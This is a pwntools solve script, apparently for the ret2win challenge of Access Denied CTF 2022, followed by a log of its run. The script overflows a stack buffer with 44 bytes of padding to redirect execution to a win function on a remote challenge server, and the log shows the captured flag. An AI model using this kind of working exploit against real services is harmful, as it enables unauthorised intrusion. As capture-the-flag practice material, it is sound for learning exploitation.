from pwn import *

#context(os='linux', arch='i386')
#context.log_level = 'debug'

BINARY = './ret2win'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "34.134.85.196"
  PORT = 1337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

buf  = "A"*44
buf += p32(elf.sym.win)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_Ret2Win/ret2win$ python solve.py r
[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_Ret2Win/ret2win/ret2win'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to 34.134.85.196 on port 1337: Done
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

accessdenied{fl0w_fl0w_0v3rfl0w_g3t_w1n_07372581}
'''
